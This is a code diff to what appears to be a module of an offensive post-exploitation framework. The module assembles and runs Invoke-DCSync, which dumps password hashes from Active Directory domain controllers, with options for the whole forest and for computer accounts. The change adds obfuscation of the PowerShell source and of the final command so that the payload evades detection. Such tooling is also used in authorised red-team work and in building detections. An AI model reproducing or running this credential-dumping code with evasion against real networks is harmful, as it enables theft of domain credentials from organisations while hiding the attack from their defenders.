@@ -75,11 +75,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-DCSync.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -91,20 +93,22 @@ class Module:
 
         script = moduleCode
 
-        script += "Invoke-DCSync -PWDumpFormat "
+        scriptEnd = "Invoke-DCSync -PWDumpFormat "
 
         if self.options["Domain"]['Value'] != '':
-            script += " -Domain " + self.options['Domain']['Value']
+            scriptEnd += " -Domain " + self.options['Domain']['Value']
 
         if self.options["Forest"]['Value'] != '':
-            script += " -DumpForest "
+            scriptEnd += " -DumpForest "
 
         if self.options["Computers"]['Value'] != '':
-            script += " -GetComputers "
+            scriptEnd += " -GetComputers "
 
         if self.options["Active"]['Value'] == '':
-            script += " -OnlyActive:$false "
+            scriptEnd += " -OnlyActive:$false "
 
-        script += "| Out-String;"
-
+        scriptEnd += "| Out-String;"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
